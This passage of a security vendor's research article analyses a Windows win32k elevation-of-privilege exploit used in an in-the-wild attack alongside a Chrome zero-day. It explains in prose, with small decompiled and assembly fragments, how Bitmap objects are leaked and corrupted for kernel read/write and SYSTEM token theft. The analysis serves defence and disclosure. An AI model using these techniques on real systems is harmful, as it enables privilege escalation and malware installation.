class="crayon-line" id="crayon-676241da675f0019503203-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ThreadUnlock1</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0i64</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-31"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f0019503203-32"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">xxxDefWindowProc</span><span class="crayon-sy">(</span><span class="crayon-i">wnd</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">msg</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">wParam</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">lParam</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675f0019503203-33"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
The vulnerability in <em>NtUserSetWindowLongPtr</em> can then be used to overwrite the extra data at index zero, which happens to be a pointer to a structure containing information about the Switch Window. In other words, the vulnerability makes it possible to set some arbitrary kernel pointer that will be treated as this structure.</p>
<p>At this stage it&#8217;s enough to call <em>NtUserMessageCall</em> again, but this time with a message equal to WM_ERASEBKGND. This results in the execution of the function <em>xxxPaintSwitchWindow</em> that increments and decrements a couple of integers located by the pointer that we previously set.</p>
		<div id="crayon-676241da675f2093491641" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
sub     [rdi+60h], ebx
add     [rdi+68h], ebx
...
sub     [rdi+5Ch], ecx
add     [rdi+64h], ecx</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675f2093491641-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f2093491641-2">2</div><div class="crayon-num" data-line="crayon-676241da675f2093491641-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675f2093491641-4">4</div><div class="crayon-num" data-line="crayon-676241da675f2093491641-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675f2093491641-1"><span class="crayon-i">sub</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">[</span><span class="crayon-i">rdi</span>+<span class="crayon-cn">60h</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">ebx</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f2093491641-2"><span class="crayon-i">add</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">[</span><span class="crayon-i">rdi</span>+<span class="crayon-cn">68h</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ebx</span></div><div class="crayon-line" id="crayon-676241da675f2093491641-3"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675f2093491641-4"><span class="crayon-i">sub</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">[</span><span class="crayon-i">rdi</span>+<span class="crayon-cn">5Ch</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">ecx</span></div><div class="crayon-line" id="crayon-676241da675f2093491641-5"><span class="crayon-i">add</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">[</span><span class="crayon-i">rdi</span>+<span class="crayon-cn">64h</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ecx</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
An important condition for triggering the exploitable code path is that the ALT key needs to be pressed.</p>
<p>Exploitation is performed by abusing Bitmaps. For successful exploitation a few Bitmaps need to be allocated next to each other, and their kernel addresses need to be known. To achieve this, the exploit uses two common kernel ASLR bypass techniques. For Windows 7 and Windows 10 build 10240 (Threshold 1) the Bitmap kernel addresses are leaked via the GdiSharedHandleTable <a href="https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives">technique</a>: in older versions of the OS there is a special table available in the user level that holds the kernel addresses of all GDI objects present in the process. This particular technique was patched in Windows 10 build 14393 (Redstone 1), so for this version the exploit uses another common <a href="https://labs.f-secure.com/archive/a-tale-of-bitmaps/">technique</a> that abuses Accelerator Tables (patched in Redstone 2). It involves creating a Create Accelerator Table object, leaking its kernel address from the gSharedInfo HandleTable available in the user level, and then freeing the Accelerator Table object and allocating a Bitmap reusing the same memory address.</p>
<p>The whole exploitation process works as follows: the exploit creates three bitmaps located next to each other and their addresses are leaked. The exploit prepares Switch Window and uses a vulnerability in NtUserSetWindowLongPtr to set an address pointing near the end of the first Bitmap as Switch Window extra data. Bitmaps are represented by a SURFOBJ structure and the previously set address needs to be calculated in a way that will make the xxxPaintSwitchWindow function increment the sizlBitmap field of the SURFOBJ structure for the Bitmap allocated next to the first one. The sizlBitmap field indicates the bounds of the pixel data buffer and the incremented value will allow the use of the function SetBitmapBits() to perform an out-of-bounds write and overwrite the SURFOBJ of the third Bitmap object.</p>
<p>The pvScan0 field of the SURFOBJ structure is an address of the pixel data buffer, so the ability to overwrite it with an arbitrary pointer results in arbitrary read/write primitives via the functions GetBitmapBits()/SetBitmapBits(). The exploit uses these primitives to parse the EPROCESS structure and steal the system token. To get the kernel address of the EPROCESS structure, the exploit uses the function <a href="https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers">EnumDeviceDrivers</a>. This function works according to its MSDN description and it provides a list of kernel addresses for currently loaded drivers. The first address in the list is the address of ntkrnl and to get the offset to the EPROCESS structure the exploit parses an executable in search for the exported PsInitialSystemProcess variable.</p>
<p>It&#8217;s worth noting that this technique still works in the latest versions of Windows (tested with Windows 10 19H1 build 18362). Stealing the system token is the most common post exploitation technique that we see in the majority of elevation of privilege exploits. After acquiring system privileges the exploit downloads and executes the actual malware.</p>
<h2 id="conclusions">Conclusions</h2>
<p>It was particularly interesting for us to examine the Chrome exploit because it was the first Google Chrome in-the-wild zero-day encountered for a while. It was also interesting that it was used in combination with an elevation of privilege exploit that didn&#8217;t allow exploitation on the latest versions of Windows mostly due to the Win32k lockdown security feature of Google Chrome. With regards to privilege elevation, it was also interesting that we found another 1-day exploit for this vulnerability just one week after the patch, indicating how simple it is to exploit this vulnerability.</p>
<p><em>We would like to thank the Google Chrome and Microsoft security teams for fixing these vulnerabilities so quickly. Google was generous enough to offer a bounty for CVE-2019-13720. The reward was donated to charity and Google matched the donation.</em></p>
												</div>
											</div>
										</div>

										<div class="c-article__footer">
											<div class="c-article__categories">
													<ul class="c-list-tags">
				<li><a   href="https://securelist.com/tag/google-chrome/" class="c-link-tag"><span>Google Chrome</span></a></li>
					<li><a   href="https://securelist.com/tag/malware-technologies/" class="c-link-tag"><span>Malware Technologies</span></a></li>
					<li><a   href="https://securelist.com/tag/microsoft-windows/" class="c-link-tag"><span>Microsoft Windows</span></a></li>
					<li><a   href="https://securelist.com/tag/vulnerabilities-and-exploits/" class="c-link-tag"><span>Vulnerabilities and exploits</span></a></li>
					<li><a   href="https://securelist.com/tag/watering-hole-attacks/" class="c-link-tag"><span>Watering hole attacks</span></a></li>
					<li><a   href="https://securelist.com/tag/zero-day-vulnerabilities/" class="c-link-tag"><span>Zero-day vulnerabilities</span></a></li>
			</ul>
												</div>
											<div class="c-article__authors u-hidden@md">
												<p class="c-title--extra-small">Authors</p>
												<ul class="c-list-authors">
																<li>
			<a  href="https://securelist.com/author/borislarin/" >
								<img alt='' src='https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/21152203/Boris-Larin_Securelist_2023-30x30.jpg' srcset='https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/03/21152203/Boris-Larin_Securelist_2023-60x60.jpg 2x' class='avatar avatar-30 photo' height='30' width='30' loading='lazy' decoding='async'/>										<span>Boris Larin</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/alexeykulaev/" >
													<img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/avatar-default/avatar_default_3.png">
										<span>Alexey Kulaev</span></a>
		</li>
														</ul>
											</div>
										</div>
				<div id="comments" class="entry-comments c-article__comments js-comments-wrapper">
	<p class="c-title--extra-small">The zero-day exploits of Operation WizardOpium</p>		<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="u-hidden"> <small></small></h3><form action="https://securelist.com/wp-comments-post.php" method="post" id="loginform" class="comment-form"><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message">Required fields are marked <span class="required">*</span></span></p><div class="comment-form-comment"><textarea id="comment" name="comment" style="width:100%" rows="8" aria-required="true" placeholder="Type your comment here"></textarea></div><!-- .comment-form-comment --><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" autocomplete="name" required="required" /></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="text" value="" size="30" maxlength="100" aria-describedby="email-notes" autocomplete="email" required="required" /></p>
<script type="text/javascript">
                document.addEventListener("input", function (event) {
                    if (!event.target.closest("#comment")) return;

                    try{
                        grecaptcha.render("recaptcha-submit-btn-area", {
                            "sitekey" : "6LfQdrAaAAAAAEb_rTrwlbyc8z0Fa9CMjELY_2Ts",
                            "theme" : "standard"
                        });
                    }catch(error){/*possible duplicated instances*/}
                });
            </script>

            <script src="https://www.google.com/recaptcha/api.js?hl=en&render=explicit" async defer></script>        <div id="recaptcha-submit-btn-area">&nbsp;</div>
        <noscript>
            <style type="text/css">#form-submit-save {display:none;}</style>
            <input name="submit" type="submit" id="submit-alt" tabindex="6" value="Submit Comment"/>
        </noscript>
        <p class="form-submit"><input name="submit" type="submit" id="commentsubmit" class="submit" value="Comment" /><a rel="nofollow" id="cancel-comment-reply-link" href="/the-zero-day-exploits-of-operation-wizardopium/97086/#respond" style="display:none;">Cancel</a> <input type='hidden' name='comment_post_ID' value='97086' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="bcd976566a" /></p><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="228"/><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
				<ol class="comment-list js-comments">
			
		<li class="comment even thread-even depth-1  js-comment" id="comment-3302621">
			<article>
				<figure class="comment-avatar">
									</figure>

				<header class="comment-header">
					<div class="comment-author">
						<p class="comment-name"><span>Anthony</span> <span class="says"></span></p>
						<div class="comment-meta commentmetadata">

							Posted on							<time datetime="2020-12-21T09:35:32+00:00">December 21, 2020. 9:35 am</time>						</div><!-- .comment-meta -->

					</div><!-- .comment-author -->
				</header>

				<div class="comment-content">
										<p>Thank you both (B. Larin &amp; A. Kulaev) for this great article ! It was really instructive ! I will take some time in a few days to really read &amp; understand each lines of the given code.</p>
					<div class="comment-reply"><a rel='nofollow' class='comment-reply-link' href='https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/?replytocom=3302621#respond' data-commentid="3302621" data-postid="97086" data-belowelement="comment-3302621" data-respondelement="respond" data-replyto="Reply to Anthony" aria-label='Reply to Anthony'>Reply</a></div><!-- .comment-reply -->				</div><!-- .comment-content -->

			</article>
	</li><!-- #comment-## -->
		</ol><!-- .comment-list -->

		
		
	
</div><!-- .entry-comments -->
											</div>
									<div class="o-col c-article__sidebar c-widgets--distributed u-hidden u-flex@md">
																				<div class="c-widget__wrapper">
											<div class="c-highlight js-accordion is-active u-hidden u-block@md js-sticky-widget">
												<div class="c-accordion-toggle js-accordion-toggle">
													<div class="c-highlight__header">
														<div class="c-highlight__icon">
															<div class="u-block--theme-light u-hidden--theme-dark">
																<img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/icon/icon-categories.svg" />
															</div>
															<div class="u-block--theme-dark u-hidden--theme-light">
																<img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/icon/icon-categories--invert.svg" />
															</div>
														</div>
														<div class="c-highlight__title">
															<p>Table of Contents</p>
														</div>
													</div>
												</div>
												<div class="js-accordion-container">
													<div class="c-highlight__body">
														<ul class='c-list-links'><li><a href="#google-chrome-remote-code-execution-exploit">Google Chrome remote code execution exploit</a></li><li><a href="#microsoft-windows-elevation-of-privilege-exploit">Microsoft Windows elevation of privilege exploit</a></li><li><a href="#conclusions">Conclusions</a></li></ul>													</div>
												</div>
											</div>
										</div>
																					<div class="c-widget__wrapper">
		<div class="js-sticky-widget">
					<p><span class="c-tag c-tag--primary">GReAT webinars</span></p>
							<div class="o-row o-row--small-gutters">
				<div class="o-col-12 c-card__dividers c-card__dividers--hide-first@xs c-card__dividers--show-last@xs">
														<article class="c-card c-card--hor-reverse@xs u-items-center">
						<div class="c-card__body">
							<header class="c-card__header">
															<time datetime="2021-05-13T13:00:00+00:00" class="c-card__event-date">
																		13 May 2021, 1:00pm								</time>
															<h3 class="c-card__title c-card__title--has-icon"><a href="https://securelist.com/webinars/great-ideas-balalaika-edition/" class="c-card__title-icon"><svg class="o-icon o-svg-icon o-svg-larger"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-webinar"></use></svg></a><a href="https://securelist.com/webinars/great-ideas-balalaika-edition/" class="c-card__link">GReAT Ideas. Balalaika Edition</a></h3>							</header>
							<footer class="c-card__footer">
								<div class="c-card__authors">
									<ul class="c-list-authors c-list-authors--comma">
													<li>
			<a  href="https://securelist.com/author/borislarin/" >
						<span>Boris Larin</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/denislegezo/" >
						<span>Denis Legezo</span></a>
		</li>
											</ul>
								</div>
							</footer>
						</div>
					</article>
														<article class="c-card c-card--hor-reverse@xs u-items-center">
						<div class="c-card__body">
							<header class="c-card__header">
															<time datetime="2021-02-26T12:00:00+00:00" class="c-card__event-date">
																		26 Feb 2021, 12:00pm								</time>
															<h3 class="c-card__title c-card__title--has-icon"><a href="https://securelist.com/webinars/great-ideas-green-tea-edition/" class="c-card__title-icon"><svg class="o-icon o-svg-icon o-svg-larger"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-webinar"></use></svg></a><a href="https://securelist.com/webinars/great-ideas-green-tea-edition/" class="c-card__link">GReAT Ideas. Green Tea Edition</a></h3>							</header>
							<footer class="c-card__footer">
								<div class="c-card__authors">
									<ul class="c-list-authors c-list-authors--comma">
													<li>
			<a  href="https://securelist.com/author/johnhultquist/" >
						<span>John Hultquist</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/brian_bartholomew/" >
						<span>Brian Bartholomew</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/suguru/" >
						<span>Suguru Ishimaru</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/vitalykamluk/" >
						<span>Vitaly Kamluk</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/seongsupark/" >
						<span>Seongsu Park</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/yusukeniwa/" >
						<span>Yusuke Niwa</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/motohikosato/" >
						<span>Motohiko Sato</span></a>
		</li>
											</ul>
								</div>
							</footer>
						</div>
					</article>
														<article class="c-card c-card--hor-reverse@xs u-items-center">
						<div class="c-card__body">
							<header class="c-card__header">
															<time datetime="2020-06-17T13:00:00+00:00" class="c-card__event-date">
																		17 Jun 2020, 1:00pm								</time>
															<h3 class="c-card__title c-card__title--has-icon"><a href="https://securelist.com/webinars/great-ideas-powered-by-sas-malware-attribution-and-next-gen-iot-honeypots/" class="c-card__title-icon"><svg class="o-icon o-svg-icon o-svg-larger"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-webinar"></use></svg></a><a href="https://securelist.com/webinars/great-ideas-powered-by-sas-malware-attribution-and-next-gen-iot-honeypots/" class="c-card__link">GReAT Ideas. Powered by SAS: malware attribution and next-gen IoT honeypots</a></h3>							</header>
							<footer class="c-card__footer">
								<div class="c-card__authors">
									<ul class="c-list-authors c-list-authors--comma">
													<li>
			<a  href="https://securelist.com/author/marcopreuss/" >
						<span>Marco Preuss</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/denislegezo/" >
						<span>Denis Legezo</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/costin/" >
						<span>Costin Raiu</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/kurtb/" >
						<span>Kurt Baumgartner</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/dandemeter/" >
						<span>Dan Demeter</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/yaroslavshmelev/" >
						<span>Yaroslav Shmelev</span></a>
		</li>
											</ul>
								</div>
							</footer>
						</div>
					</article>
														<article class="c-card c-card--hor-reverse@xs u-items-center">
						<div class="c-card__body">
							<header class="c-card__header">
															<time datetime="2020-08-26T14:00:00+00:00" class="c-card__event-date">
																		26 Aug 2020, 2:00pm								</time>
															<h3 class="c-card__title c-card__title--has-icon"><a href="https://securelist.com/webinars/great-ideas-powered-by-sas-threat-actors-advance-on-new-fronts/" class="c-card__title-icon"><svg class="o-icon o-svg-icon o-svg-larger"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-webinar"></use></svg></a><a href="https://securelist.com/webinars/great-ideas-powered-by-sas-threat-actors-advance-on-new-fronts/" class="c-card__link">GReAT Ideas. Powered by SAS: threat actors advance on new fronts</a></h3>							</header>
							<footer class="c-card__footer">
								<div class="c-card__authors">
									<ul class="c-list-authors c-list-authors--comma">
													<li>
			<a  href="https://securelist.com/author/ivankwiatkowski/" >
						<span>Ivan Kwiatkowski</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/maheryamout/" >
						<span>Maher Yamout</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/noushinshabab/" >
						<span>Noushin Shabab</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/pierredelcher/" >
						<span>Pierre Delcher</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/felixaime/" >
						<span>Félix Aime</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/giampaolodedola/" >
						<span>Giampaolo Dedola</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/santiago/" >
						<span>Santiago Pontiroli</span></a>
		</li>
											</ul>
								</div>
							</footer>
						</div>
					</article>
														<article class="c-card c-card--hor-reverse@xs u-items-center">
						<div class="c-card__body">
							<header class="c-card__header">
															<time datetime="2020-07-22T14:00:00+00:00" class="c-card__event-date">
																		22 Jul 2020, 2:00pm								</time>
															<h3 class="c-card__title c-card__title--has-icon"><a href="https://securelist.com/webinars/great-ideas-powered-by-sas-threat-hunting-and-new-techniques/" class="c-card__title-icon"><svg class="o-icon o-svg-icon o-svg-larger"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-webinar"></use></svg></a><a href="https://securelist.com/webinars/great-ideas-powered-by-sas-threat-hunting-and-new-techniques/" class="c-card__link">GReAT Ideas. Powered by SAS: threat hunting and new techniques</a></h3>							</header>
							<footer class="c-card__footer">
								<div class="c-card__authors">
									<ul class="c-list-authors c-list-authors--comma">
													<li>
			<a  href="https://securelist.com/author/dimitrybestuzhev/" >
						<span>Dmitry Bestuzhev</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/costin/" >
						<span>Costin Raiu</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/pierredelcher/" >
						<span>Pierre Delcher</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/brian_bartholomew/" >
						<span>Brian Bartholomew</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/borislarin/" >
						<span>Boris Larin</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/arieljungheit/" >
						<span>Ariel Jungheit</span></a>
		</li>
			<li>
			<a  href="https://securelist.com/author/fabioa/" >
						<span>Fabio Assolini</span></a>
		</li>
											</ul>
								</div>
							</footer>
						</div>
					</article>
												</div>
			</div>
				</div>
	</div>
													<div class="c-widget__wrapper">
			<div class="js-sticky-widget">
				<p><span class="c-tag c-tag--primary">From the same authors</span></p>
				<div class="o-row o-row--small-gutters">
							<div class="o-col-12 c-card__dividers c-card__dividers--hide-first@xs c-card__dividers--show-last@xs">
			<article class="c-card c-card--hor-reverse@xs u-items-center">
		<a   href="https://securelist.com/lazarus-apt-steals-crypto-with-a-tank-game/114282/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/10/23081348/lazarus-sas-featured-image-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/10/23081348/lazarus-sas-featured-image-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/lazarus-apt-steals-crypto-with-a-tank-game/114282/" class="c-card__link">The Crypto Game of Lazarus APT: Investors vs. Zero-days</a></h3>		</header>
					</div>
</article>
		</div>
					<div class="o-col-12 c-card__dividers c-card__dividers--hide-first@xs c-card__dividers--show-last@xs">
			<article class="c-card c-card--hor-reverse@xs u-items-center">
		<a   href="https://securelist.com/cve-2024-30051/112618/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/05/24151135/sl-abstract-security-alert-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/05/24151135/sl-abstract-security-alert-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/cve-2024-30051/112618/" class="c-card__link">QakBot attacks with Windows zero-day (CVE-2024-30051)</a></h3>		</header>
					</div>
</article>
		</div>
					<div class="o-col-12 c-card__dividers c-card__dividers--hide-first@xs c-card__dividers--show-last@xs">
			<article class="c-card c-card--hor-reverse@xs u-items-center">
		<a   href="https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="" sizes="(max-width: 800px) 100vw, 800px" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-800x450.jpg" data-srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-800x450.jpg 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-300x169.jpg 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-1024x576.jpg 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-768x432.jpg 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-622x350.jpg 622w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-740x416.jpg 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-498x280.jpg 498w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware.jpg 1200w" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/" class="c-card__link">Operation Triangulation: The last (hardware) mystery</a></h3>		</header>
					</div>
</article>
		</div>
					<div class="o-col-12 c-card__dividers c-card__dividers--hide-first@xs c-card__dividers--show-last@xs">
			<article class="c-card c-card--hor-reverse@xs u-items-center">
		<a   href="https://securelist.com/windows-clfs-exploits-ransomware-cve-2023-23376/111593/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/21102655/Windows-CLFS-five-exploits-ransomware_CVE-2023-23376_featured-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/21102655/Windows-CLFS-five-exploits-ransomware_CVE-2023-23376_featured-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/windows-clfs-exploits-ransomware-cve-2023-23376/111593/" class="c-card__link">Windows CLFS and five exploits used by ransomware operators (Exploit #4 – CVE-2023-23376)</a></h3>		</header>
					</div>
</article>
		</div>
					<div class="o-col-12 c-card__dividers c-card__dividers--hide-first@xs c-card__dividers--show-last@xs">
			<article class="c-card c-card--hor-reverse@xs u-items-center">
		<a   href="https://securelist.com/windows-clfs-exploits-ransomware-october-2022/111591/" class="c-card__figure" style="">
		<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/21102720/Windows-CLFS-five-exploits-ransomware_October-2022_featured-800x450.jpg" class="attachment-securelist-2020-thumbnail size-securelist-2020-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/21102720/Windows-CLFS-five-exploits-ransomware_October-2022_featured-800x450.jpg" data-srcset="" srcset="" />	</a>
		<div class="c-card__body">
		<header class="c-card__header">
		
		
			<h3 class="c-card__title"><a   href="https://securelist.com/windows-clfs-exploits-ransomware-october-2022/111591/" class="c-card__link">Windows CLFS and five exploits used by ransomware operators (Exploit #3 – October 2022)</a></h3>		</header>
					</div>
</article>
		</div>
							</div>
			</div>
		</div>
					<div class="c-widget__wrapper">
				<div class="c-widget-subscribe js-sticky-widget">
					<div class="c-block__header">
						<h5 class="c-title--small">Subscribe to our weekly e-mails</h5>
						<p>The hottest research right in your inbox</p>
					</div>
					<div class="c-form--float-labels js-float-labels">
						<script type="text/javascript"></script>
                <div class='gf_browser_chrome gform_wrapper gform_wrapper_original_id_11 gravity-theme subscribe-mc_wrapper' id='gform_wrapper_231955316' ><div id='gf_231955316' class='gform_anchor' tabindex='-1'></div><form method='post' enctype='multipart/form-data' target='gform_ajax_frame_231955316' id='gform_231955316' class='subscribe-mc' action='/the-zero-day-exploits-of-operation-wizardopium/97086/#gf_231955316' >
